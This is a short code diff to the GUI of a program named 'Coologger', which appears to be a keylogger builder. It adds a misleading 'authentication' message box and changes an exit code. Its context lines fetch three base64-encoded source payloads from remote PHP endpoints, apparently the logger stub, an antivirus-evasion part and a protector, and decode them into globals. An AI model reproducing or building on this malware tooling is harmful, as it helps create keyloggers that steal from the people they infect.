@@ -101,6 +101,7 @@ namespace Coologger.GUI
                 {
                     return false;
                 }
+                MessageBox.Show("Please hold while the authentication system works some magic.\r\nThis can take a while depending on your internet connection.\r\nClick OK to begin.");
                 Global.Source = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSource.php")));
                 Global.SourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSourceAv.php")));
                 Global.SourceProtect = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSourceProtect.php")));
@@ -165,7 +166,7 @@ namespace Coologger.GUI
 
         private void PictureBox2Click(object sender, EventArgs e)
         {
-            Application.Exit();
+            Environment.Exit(1337);
         }
 
         #region MouseControls
